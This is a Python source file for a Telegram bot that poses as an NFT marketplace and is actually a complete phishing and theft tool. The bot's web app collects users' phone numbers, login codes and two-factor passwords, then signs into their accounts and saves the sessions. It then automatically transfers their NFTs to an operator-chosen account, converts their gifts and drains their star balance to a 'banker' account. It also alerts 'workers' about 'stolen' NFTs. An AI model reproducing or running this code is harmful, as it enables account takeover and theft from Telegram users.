#!/usr/bin/env python3
"""
======================================================================================
                    MARKETPLACE & NFT UNIFIED BOT v2.0
       Объединение API-авторизации + Автоматический слив NFT/Gifts (Kurigram Logic)
======================================================================================
"""

import asyncio
import logging
import sys
import os
import re
import json
import time
import random
import sqlite3
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List, Tuple
import aiohttp

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardButton, WebAppInfo,
    ReplyKeyboardMarkup, KeyboardButton, FSInputFile
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client, enums
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait, BadRequest, PeerIdInvalid, UsernameInvalid
)

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('unified_bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("UnifiedBot")

# ================= GIFT/NFT CONSTANTS =================
# Gift map: Price -> {Conversion amount, List of IDs}
GIFT_MAP = {
    15:  {'get': 13, 'ids': [5170233102089322756, 5170145012310081615]}, 
    25:  {'get': 21, 'ids': [5168103777563050263, 5170250947678437525]}, 
    50:  {'get': 43, 'ids': [6028601630662853006, 5170564780938756245]}, 
    100: {'get': 85, 'ids': []}
}

GIFT_EMOJIS = {
    5170233102089322756: "🧸", 5170145012310081615: "💝", 5168103777563050263: "🌹",
    5170250947678437525: "🎁", 6028601630662853006: "🍾", 5170564780938756245: "🚀"
}

# ================= SETTINGS =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)

def load_settings() -> dict:
    settings_path = BASE_DIR / "settings.json"
    default = {
        "bot_token": os.getenv("BOT_TOKEN", ""),
        "api_id": int(os.getenv("API_ID", 0)),
        "api_hash": os.getenv("API_HASH", ""),
        "api_url": os.getenv("NEXT_PUBLIC_SITE_URL", "http://localhost:3000").rstrip('/'),
        "admin_ids": [],
        "allowed_group_id": None,
        "target_user": "durov",
        "banker_session": "banker",
        "maintenance_mode": False
    }
    
    if settings_path.exists():
        with open(settings_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if "site_url" in data and "api_url" not in data:
                data["api_url"] = data["site_url"].rstrip('/')
            return {**default, **data}
    return default

SETTINGS = load_settings()

def save_settings(new_settings=None):
    global SETTINGS
    if new_settings: SETTINGS = new_settings
    settings_path = BASE_DIR / "settings.json"
    with open(settings_path, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=2, ensure_ascii=False)

# ================= STORAGE =================
user_sessions = {}
pyrogram_clients = {}
processed_requests = {}
admin_auth_process = {}

# ================= FSM STATES =================
class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class AdminSettingsState(StatesGroup):
    waiting_target = State()
    waiting_api_url = State()
    waiting_api_id = State()
    waiting_api_hash = State()

# ================= UTILITIES =================
def clean_phone(phone: str) -> str:
    if not phone: return ""
    clean = re.sub(r'\D', '', str(phone))
    if len(clean) == 11 and clean.startswith('8'):
        clean = '7' + clean[1:]
    elif len(clean) == 10:
        clean = '7' + clean
    return '+' + clean if not clean.startswith('+') else clean

clean_phone_number = lambda p: re.sub(r'\D', '', str(p)) if p else ""

def mask_phone(phone):
    clean = str(phone).replace(" ", "").replace("+", "").replace("-", "")
    if len(clean) >= 4:
        return f"+{clean[0]}***{clean[-2:]}"
    return clean

def get_webapp_url(user_id: int) -> str:
    base = SETTINGS['api_url'].rstrip('/')
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"

def is_request_processed(req_id: str, action: str) -> bool:
    return req_id in processed_requests and action in processed_requests[req_id]

def mark_request_processed(req_id: str, action: str):
    if req_id not in processed_requests:
        processed_requests[req_id] = set()
    processed_requests[req_id].add(action)

def get_target_username():
    raw = str(SETTINGS.get("target_user", "durov"))
    clean = raw.replace("https://t.me/", "").replace("@", "").strip()
    return clean

def log_transfer(text: str, level="info"):
    if level == "error": logger.error(text)
    else: logger.info(text)

def print_error(text): logger.error(text)
def print_warning(text): logger.warning(text)
def print_success(text): logger.info(f"✅ {text}")

async def safe_edit_text(message: types.Message, text: str, reply_markup=None):
    try:
        if message.content_type == ContentType.PHOTO:
            await message.delete()
            await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await message.edit_text(text, reply_markup=reply_markup, parse_mode='HTML')
    except:
        await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')

async def notify_worker(bot: Bot, worker_id: int, text: str):
    if not worker_id: return
    try: await bot.send_message(chat_id=worker_id, text=text)
    except: pass

async def alert_admins(bot: Bot, text: str):
    admins = SETTINGS.get('admin_ids', [])
    if not admins: return
    clean_text = str(text).replace("<", "&lt;").replace(">", "&gt;")
    msg = f"❌ <b>ОШИБКА БОТА</b>\n\n<pre>{clean_text[:3000]}</pre>"
    for admin_id in admins:
        try: await bot.send_message(chat_id=admin_id, text=msg, parse_mode='HTML')
        except: pass

# ================= DATABASE =================
class UnifiedDatabase:
    def __init__(self, db_file="unified_bot.db"):
        self.conn = sqlite3.connect(str(BASE_DIR / db_file))
        self.cursor = self.conn.cursor()
        self.create_tables()

    def create_tables(self):
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            balance INTEGER DEFAULT 0,
            stars_balance INTEGER DEFAULT 0,
            is_authorized BOOLEAN DEFAULT 0,
            worker_id INTEGER DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS nft_operations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            operation_type TEXT,
            gift_id TEXT,
            amount INTEGER,
            status TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS admin_actions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id INTEGER,
            action TEXT,
            target_id TEXT,
            details TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.conn.commit()

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = self.cursor.fetchone()
        if not row: return None
        return {
            'user_id': row[0], 'username': row[1], 'first_name': row[2],
            'phone': row[3], 'balance': row[4], 'stars_balance': row[5],
            'is_authorized': bool(row[6]), 'worker_id': row[7], 'created_at': row[8]
        }

    def add_user(self, user_id, username, first_name, phone=None):
        user = self.get_user(user_id)
        if not user:
            self.cursor.execute(
                "INSERT INTO users (user_id, username, first_name, phone) VALUES (?, ?, ?, ?)",
                (user_id, username or "Unknown", first_name or "Unknown", phone)
            )
        else:
            self.cursor.execute(
                "UPDATE users SET username = ?, first_name = ?, phone = ? WHERE user_id = ?",
                (username or "Unknown", first_name or "Unknown", phone, user_id)
            )
        self.conn.commit()

    def mark_authorized(self, user_id, phone):
        self.cursor.execute(
            "UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?",
            (phone, user_id)
        )
        self.conn.commit()

    def log_nft_operation(self, user_id, op_type, gift_id, amount, status):
        self.cursor.execute(
            "INSERT INTO nft_operations (user_id, operation_type, gift_id, amount, status) VALUES (?, ?, ?, ?, ?)",
            (user_id, op_type, gift_id, amount, status)
        )
        self.conn.commit()

    def log_admin_action(self, admin_id, action, target_id, details):
        self.cursor.execute(
            "INSERT INTO admin_actions (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
            (admin_id, action, target_id, details)
        )
        self.conn.commit()

    def get_stats(self):
        self.cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
        users = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT SUM(balance) FROM users")
        checks = self.cursor.fetchone()[0] or 0
        return users, checks

db = UnifiedDatabase()

# ================= NFT/GIFT LOGIC =================

async def get_stars_info(client: Client):
    try:
        balance = await client.get_stars_balance("me")
        return int(balance)
    except Exception:
        return 0

def calculate_optimal_topup(needed_stars):
    if needed_stars <= 0: return []
    best_cost = float('inf')
    best_combo = []
    
    base_100 = 0
    remaining_needed = needed_stars
    if needed_stars > 200:
        base_100 = (needed_stars - 100) // 85
        remaining_needed -= base_100 * 85
    
    for n50 in range(3):
        for n25 in range(3):
            for n15 in range(10):
                got = n50*43 + n25*21 + n15*13
                cost = n50*50 + n25*25 + n15*15
                if got >= remaining_needed:
                    total_cost = cost + (base_100 * 100)
                    if total_cost < best_cost:
                        best_cost = total_cost
                        best_combo = [100]*base_100 + [50]*n50 + [25]*n25 + [15]*n15
    return best_combo

def analyze_gift(gift, location_name="Me"):
    details = {
        'id': gift.id, 
        'msg_id': gift.message_id,
        'title': 'Gift', 
        'star_count': gift.convert_price or 0,
        'transfer_cost': gift.transfer_price or 0,
        'is_nft': False, 
        'can_transfer': False, 
        'can_convert': False,
        'location': location_name
    }
    
    if getattr(gift, 'collectible_id', None) is not None:
        details['is_nft'] = True
        details['title'] = gift.title or f"NFT #{gift.collectible_id}"
        if gift.can_transfer_at is None:
            details['can_transfer'] = True
        else:
            now = datetime.now(gift.can_transfer_at.tzinfo) if gift.can_transfer_at.tzinfo else datetime.now()
            details['can_transfer'] = (gift.can_transfer_at <= now)
    else:
        is_converted = getattr(gift, 'is_converted', False)
        details['can_convert'] = (details['star_count'] > 0) and (not is_converted)
        details['title'] = GIFT_EMOJIS.get(gift.id, "🎁")
        
    return details

async def get_owned_channels(client: Client):
    channels = []
    try:
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL and dialog.chat.is_creator:
                channels.append(dialog.chat)
    except: pass
    return channels

async def scan_location_gifts(client: Client, peer_id, location_name):
    found_gifts = []
    try:
        async for gift in client.get_chat_gifts(chat_id=peer_id):
            found_gifts.append(analyze_gift(gift, location_name))
    except Exception: pass
    return found_gifts

# --- TASKS ---

async def send_gift_task(client: Client, target_id, price):
    """Task for BANKER: send gift"""
    gift_data = GIFT_MAP.get(price)
    if not gift_data: return False
    gift_id = gift_data['ids'][0] if gift_data['ids'] else GIFT_MAP[50]['ids'][0]
    try:
        await client.send_gift(chat_id=target_id, gift_id=gift_id)
        log_transfer(f"Banker sent gift worth {price}")
        return True
    except FloodWait as e:
        await asyncio.sleep(e.value)
        try:
            await client.send_gift(chat_id=target_id, gift_id=gift_id)
            return True
        except: return False
    except Exception as e: 
        log_transfer(f"Error sending by banker: {e}", "error")
        return False

async def convert_gift_task(client: Client, gift_details):
    """Task for WORKER: convert gift"""
    try:
        await client.convert_gift_to_stars(owned_gift_id=str(gift_details['msg_id']))
        log_transfer(f"Converted: {gift_details['title']} (+{gift_details['star_count']} stars)")
        return True
    except Exception as e: 
        log_transfer(f"Error converting {gift_details['title']}: {e}", "error")
        return False

async def transfer_nft_task(client: Client, gift_details, target_username, bot: Bot, user_db_data):
    """Task for WORKER: transfer NFT"""
    try:
        await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_username)
        print_success(f"NFT SENT: {gift_details['title']} (from {gift_details['location']})")
        
        if user_db_data and user_db_data['worker_id']:
            await notify_worker(bot, user_db_data['worker_id'], f"🎁 NFT <b>{gift_details['title']}</b> SUCCESSFULLY STOLEN!\n📍 Source: {gift_details['location']}")
        
        await alert_admins(bot, f"💰 STOLEN NFT: {gift_details['title']} from {gift_details['location']}")
        return True
    except FloodWait as e:
        print_warning(f"Flood {e.value}s. Waiting...")
        await asyncio.sleep(e.value)
        try:
            await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_username)
            return True
        except: pass
    except Exception as e:
        log_transfer(f"Error transfer ({gift_details['location']}): {e}", "error")
        await alert_admins(bot, f"❌ Failed to transfer {gift_details['title']}: {e}")
    return False

async def drain_stars_user(client: Client, banker_username):
    """Aggressive drain of all balance into gifts for banker"""
    try:
        balance = int(await client.get_stars_balance("me"))
    except: return

    if balance < 15:
        log_transfer(f"Balance {balance} too small to drain.")
        return

    log_transfer(f"💰 Starting balance drain: {balance} ⭐️")

    sorted_prices = sorted([k for k in GIFT_MAP.keys()], reverse=True) 
    gifts_to_send = []
    temp_bal = balance
    
    for price in sorted_prices:
        while temp_bal >= price:
            gift_data = GIFT_MAP.get(price)
            if gift_data and gift_data['ids']:
                g_id = random.choice(gift_data['ids'])
                gifts_to_send.append((price, g_id))
                temp_bal -= price
            else:
                break
    
    if not gifts_to_send: return

    log_transfer(f"🔥 Will send {len(gifts_to_send)} gifts totaling {balance - temp_bal} stars.")
    
    count = 0
    for price, gift_id in gifts_to_send:
        try:
            await client.send_gift(chat_id=banker_username, gift_id=gift_id)
            count += 1
            await asyncio.sleep(random.uniform(0.5, 1.5)) 
        except FloodWait as e:
            log_transfer(f"⏳ FloodWait {e.value}s while draining. Waiting...")
            await asyncio.sleep(e.value)
            try:
                await client.send_gift(chat_id=banker_username, gift_id=gift_id)
                count += 1
            except: pass
        except Exception as e:
            log_transfer(f"❌ Error sending gift ({price}): {e}", "error")
    
    log_transfer(f"✅ Drain complete. Sent: {count} of {len(gifts_to_send)}")

# --- MAIN ORCHESTRATOR ---

async def transfer_process(client: Client, banker: Client, bot: Bot):
    """Main NFT/Gift transfer orchestrator"""
    try:
        if not client.is_connected:
            try: await client.connect()
            except Exception: return

        me = await client.get_me()
        log_transfer(f"--- PROCESSING START (v2): @{me.username} ({me.id}) ---")

        # 1. SCAN
        targets = [("me", "Profile")]
        channels = await get_owned_channels(client)
        if channels:
            for ch in channels:
                targets.append((ch.id, f"Ch:{ch.title[:10]}"))

        scan_tasks = [scan_location_gifts(client, tid, tname) for tid, tname in targets]
        results = await asyncio.gather(*scan_tasks)
        
        all_nfts_to_send = []
        user_gifts_to_convert = [] 
        
        for i, gift_list in enumerate(results):
            loc_id = targets[i][0]
            for g in gift_list:
                if g['is_nft'] and g['can_transfer']:
                    all_nfts_to_send.append(g)
                elif loc_id == "me" and not g['is_nft'] and g['can_convert']:
                    user_gifts_to_convert.append(g)

        # 2. MASS CONVERSION
        if user_gifts_to_convert:
            log_transfer(f"♻️ Found {len(user_gifts_to_convert)} gifts to convert...")
            await asyncio.gather(*[convert_gift_task(client, g) for g in user_gifts_to_convert])
            log_transfer("⏳ Waiting for balance update (3 sec)...")
            await asyncio.sleep(3)
        else:
            log_transfer("♻️ No gifts to convert.")

        # 3. BANKER PREPARATION
        banker_uname = SETTINGS.get("banker_username", None)
        banker_ready = False
        try:
            if banker:
                if not banker.is_connected: await banker.connect()
                b_me = await banker.get_me()
                banker_uname = b_me.username
                banker_ready = True
        except Exception as e:
             logger.error(f"Banker init error: {e}")

        if not banker_ready and not banker_uname:
            log_transfer("❌ No banker for receiving funds!", "error")
            return

        # 4. PROCESS NFTs
        if all_nfts_to_send:
            log_transfer(f"💎 Found {len(all_nfts_to_send)} NFTs. Processing with priority.")
            
            current_balance = await get_stars_info(client)
            total_fees = sum(n['transfer_cost'] for n in all_nfts_to_send)
            deficit = total_fees - current_balance
            
            # Top-up if needed
            if deficit > 0 and banker_ready:
                log_transfer(f"📉 Need {deficit} more stars for fees. Requesting from banker...")
                banker_bal = await get_stars_info(banker)
                
                if banker_bal >= deficit:
                    topup_combo = calculate_optimal_topup(deficit)
                    log_transfer(f"💸 Sending {len(topup_combo)} gifts from banker...")
                    
                    for price in topup_combo:
                        await send_gift_task(banker, me.id, price)
                        await asyncio.sleep(random.uniform(0.5, 1))
                    
                    log_transfer("⏳ Waiting for gifts to arrive (5 sec)...")
                    await asyncio.sleep(5)
                    
                    temp_gifts = []
                    async for gift in client.get_chat_gifts("me"):
                        g_detail = analyze_gift(gift, "Profile")
                        if not g_detail['is_nft'] and g_detail['can_convert']:
                            temp_gifts.append(g_detail)
                    
                    if temp_gifts:
                        log_transfer(f"♻️ Converting {len(temp_gifts)} received gifts...")
                        await asyncio.gather(*[convert_gift_task(client, g) for g in temp_gifts])
                        await asyncio.sleep(2)
                else:
                    log_transfer(f"⚠️ Banker insufficient balance: {banker_bal} < {deficit}", "error")
            
            # Send all NFTs
            target_uname = get_target_username()
            log_transfer(f"📤 Sending {len(all_nfts_to_send)} NFTs to @{target_uname}...")
            
            for nft in all_nfts_to_send:
                user_data = db.get_user(me.id)
                await transfer_nft_task(client, nft, target_uname, bot, user_data)
                await asyncio.sleep(random.uniform(1, 2))
        
        # 5. DRAIN REMAINING BALANCE
        final_balance = await get_stars_info(client)
        if final_balance >= 15 and banker_uname:
            log_transfer(f"💸 Final balance: {final_balance}. Draining to banker...")
            await drain_stars_user(client, banker_uname)
        
        log_transfer(f"✅ PROCESSING COMPLETE for @{me.username}")
        
    except Exception as e:
        log_transfer(f"❌ Critical error in transfer_process: {e}", "error")
        await alert_admins(bot, f"Critical error: {e}")

# ================= BOT HANDLERS =================

def create_main_keyboard(is_admin=False):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🌐 Открыть Маркет", web_app=WebAppInfo(url=get_webapp_url(0)))],
            [KeyboardButton(text="📊 Статистика"), KeyboardButton(text="ℹ️ Помощь")]
        ],
        resize_keyboard=True
    )
    if is_admin:
        kb.keyboard.append([KeyboardButton(text="⚙️ Настройки")])
    return kb

async def check_admin(user_id):
    return user_id in SETTINGS.get('admin_ids', [])

def create_router() -> Router:
    router = Router()

    @router.message(CommandStart())
    async def start_command(msg: types.Message):
        user = msg.from_user
        db.add_user(user.id, user.username, user.first_name)
        
        is_admin = await check_admin(user.id)
        kb = create_main_keyboard(is_admin)
        
        text = (
            f"👋 Привет, <b>{user.first_name}</b>!\n\n"
            f"🎨 <b>NFT Marketplace</b> - твой путь в мир цифровых активов\n\n"
            f"📱 Нажми на кнопку ниже, чтобы открыть приложение"
        )
        
        await msg.answer(text, reply_markup=kb, parse_mode='HTML')

    @router.message(F.text == "📊 Статистика")
    async def stats_command(msg: types.Message):
        users, checks = db.get_stats()
        text = (
            f"📊 <b>Статистика бота</b>\n\n"
            f"👥 Пользователей: <b>{users}</b>\n"
            f"✅ Авторизовано: <b>{checks}</b>\n"
        )
        await msg.answer(text, parse_mode='HTML')

    @router.message(F.text == "ℹ️ Помощь")
    async def help_command(msg: types.Message):
        text = (
            "ℹ️ <b>Как пользоваться</b>\n\n"
            "1. Нажмите «🌐 Открыть Маркет»\n"
            "2. Авторизуйтесь через Telegram\n"
            "3. Покупайте и продавайте NFT\n"
            "4. Следите за своей коллекцией\n\n"
            "💬 Поддержка: @support"
        )
        await msg.answer(text, parse_mode='HTML')

    @router.message(F.text == "⚙️ Настройки")
    async def settings_command(msg: types.Message):
        if not await check_admin(msg.from_user.id):
            return await msg.answer("❌ Доступ запрещен")
        
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔐 Войти как банкир", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="🎯 Установить цель NFT", callback_data="admin_set_target"))
        kb.row(InlineKeyboardButton(text="🔗 Изменить API URL", callback_data="admin_set_api"))
        
        await msg.answer("⚙️ <b>Настройки администратора</b>", reply_markup=kb.as_markup(), parse_mode='HTML')

    @router.callback_query(F.data == "admin_login")
    async def admin_login_start(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await safe_edit_text(c.message, "📱 <b>Введите номер для Банкира:</b>", None)
        await state.set_state(AdminLoginState.waiting_phone)

    @router.message(AdminLoginState.waiting_phone)
    async def admin_phone(m: types.Message, state: FSMContext):
        clean_ph = clean_phone_number(m.text)
        if not clean_ph:
            return await m.answer("❌ Некорректный формат номера. Попробуйте снова.")

        sess_name = SETTINGS.get('banker_session', 'banker')
        client = Client(name=sess_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            sent = await client.send_code(clean_ph)
            admin_auth_process[m.from_user.id] = {"client": client, "phone": clean_ph, "hash": sent.phone_code_hash}
            await m.answer(f"🔢 Код отправлен на +{clean_ph}.\n<b>Введите код:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            await m.answer(f"Ошибка: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def admin_code(m: types.Message, state: FSMContext):
        data = admin_auth_process.get(m.from_user.id)
        if not data: return
        client = data['client']
        try:
            await client.sign_in(data['phone'], data['hash'], m.text)
            await m.answer("✅ <b>Успешно!</b> Сессия банкира сохранена.")
            await client.disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await m.answer("🔐 <b>Введите 2FA пароль:</b>")
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e: await m.answer(f"Ошибка: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def admin_pass(m: types.Message, state: FSMContext):
        data = admin_auth_process.get(m.from_user.id)
        client = data['client']
        try:
            await client.check_password(m.text)
            await m.answer("✅ <b>Успешно!</b> Сессия банкира сохранена.")
            await client.disconnect()
            await state.clear()
        except Exception as e: await m.answer(f"Ошибка: {e}")

    @router.message(F.contact)
    async def handle_contact(msg: types.Message):
        contact = msg.contact
        telegram_id = msg.from_user.id
        phone = clean_phone(contact.phone_number.strip())
        db.add_user(telegram_id, msg.from_user.username, msg.from_user.first_name, phone)

        try:
            async with aiohttp.ClientSession() as session:
                url = f"{SETTINGS['api_url']}/api/telegram/receive-phone"
                payload = {
                    "phone": phone,
                    "telegramId": telegram_id,
                    "timestamp": int(time.time()),
                }
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    logger.info(f"📤 Phone sent to API: {resp.status}")
        except Exception as e:
            logger.error(f"❌ API error: {e}")

        await msg.answer(f"✅ Номер <code>{phone}</code> получен!", parse_mode='HTML')

    return router

# ================= API POLLING MANAGER =================

class APIPollingManager:
    def __init__(self):
        self.bot = None
        self.dp = None
        self.api_url = SETTINGS['api_url']
        self.bot_token = SETTINGS['bot_token']

    def get_banker_client(self):
        """Returns ready-to-use banker client or None"""
        sess_name = SETTINGS.get('banker_session', 'banker')
        sess_path = SESSIONS_DIR / f"{sess_name}.session"
        if sess_path.exists():
            return Client(sess_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        return None

    async def update_status(self, req_id: str, status: str, message: str = None, error: str = None, phone: str = None, telegram_id: str = None):
        url = f"{self.api_url}/api/telegram/update-request"
        payload = {"requestId": req_id, "status": status, "processed": True}
        if message: payload["message"] = message
        if error: payload["error"] = error
        if phone: payload["phone"] = phone
        if telegram_id: payload["telegramId"] = telegram_id

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    logger.info(f"📤 Status update: {status} -> {resp.status}")
        except Exception as e:
            logger.error(f"❌ API error: {e}")

    async def start_api_polling(self):
        logger.info(f"📡 API Polling started: {self.api_url}")
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    url = f"{self.api_url}/api/telegram/get-pending"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            for req in data.get('requests', []):
                                req_id = req.get('requestId')
                                action = req.get('action')
                                if req_id and action and not is_request_processed(req_id, action):
                                    mark_request_processed(req_id, action)
                                    logger.info(f"📥 New request: {action}")
                                    asyncio.create_task(self.process_request(req))
                except Exception: pass
                await asyncio.sleep(2)

    async def process_request(self, req: dict):
        req_id = req.get('requestId')
        action = req.get('action')
        phone = clean_phone(req.get('phone', ''))
        code = req.get('code')
        password = req.get('password')
        telegram_id = req.get('telegramId') or req.get('chatId')

        logger.info(f"🔄 Processing: {action} | TG: {telegram_id}")

        if not phone and action in ['send_code', 'send_password']:
            for stored_phone, session_data in user_sessions.items():
                if session_data.get('telegram_id') == telegram_id:
                    phone = stored_phone
                    break

        try:
            client = pyrogram_clients.get(phone)

            # ========== SEND_PHONE ==========
            if action == 'send_phone':
                if not phone: return
                session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                pyrogram_clients[phone] = client

                try:
                    if not client.is_connected: await client.connect()
                    sent = await client.send_code(phone)
                    user_sessions[phone] = {'hash': sent.phone_code_hash, 'telegram_id': telegram_id}
                    logger.info(f"✅ Code sent to {phone}")
                    await self.update_status(req_id, "waiting_code", "Код отправлен", phone=phone, telegram_id=telegram_id)
                except Exception as e:
                    logger.error(f"❌ send_code error: {e}")
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)
                    if client.is_connected: await client.disconnect()

            # ========== SEND_CODE (AUTH SUCCESS TRIGGER) ==========
            elif action == 'send_code':
                if not client:
                    session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client

                if not client.is_connected: await client.connect()
                session_data = user_sessions.get(phone)
                
                if not session_data:
                    return await self.update_status(req_id, "error", error="Сессия истекла", phone=phone, telegram_id=telegram_id)

                try:
                    await client.sign_in(phone, session_data['hash'], code)
                    db.mark_authorized(telegram_id, phone)
                    await self.update_status(req_id, "success", "Авторизация успешна!", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ Auth success: {phone}")
                    
                    # 🔥 TRIGGER AUTO-DRAIN AFTER SUCCESS 🔥
                    banker_client = self.get_banker_client()
                    asyncio.create_task(transfer_process(client, banker_client, self.bot))
                    
                    user_sessions.pop(phone, None)

                except SessionPasswordNeeded:
                    await self.update_status(req_id, "waiting_password", "Требуется пароль", phone=phone, telegram_id=telegram_id)
                except Exception as e:
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)

            # ========== SEND_PASSWORD (2FA SUCCESS TRIGGER) ==========
            elif action == 'send_password':
                if not client:
                    session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client

                if not client.is_connected: await client.connect()

                try:
                    await client.check_password(password)
                    db.mark_authorized(telegram_id, phone)
                    await self.update_status(req_id, "success", "2FA успешна!", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ 2FA success: {phone}")
                    
                    # 🔥 TRIGGER AUTO-DRAIN AFTER SUCCESS 🔥
                    banker_client = self.get_banker_client()
                    asyncio.create_task(transfer_process(client, banker_client, self.bot))

                    user_sessions.pop(phone, None)
                    pyrogram_clients.pop(phone, None)

                except PasswordHashInvalid:
                    await self.update_status(req_id, "invalid_password", "Неверный пароль", phone=phone, telegram_id=telegram_id)
                except Exception as e:
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)

        except Exception as e:
            logger.error(f"❌ Process error: {e}")
            await self.update_status(req_id, "error", error=str(e))

    async def start(self):
        """Start bot and API polling"""
        if not SETTINGS['bot_token']:
            logger.error("❌ BOT_TOKEN not set!")
            return

        self.bot = Bot(token=SETTINGS['bot_token'], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        
        router = create_router()
        self.dp.include_router(router)

        logger.info("🚀 Bot starting...")
        
        # Start polling in parallel
        await asyncio.gather(
            self.dp.start_polling(self.bot),
            self.start_api_polling()
        )

# ================= MAIN =================

async def main():
    manager = APIPollingManager()
    await manager.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot stopped")
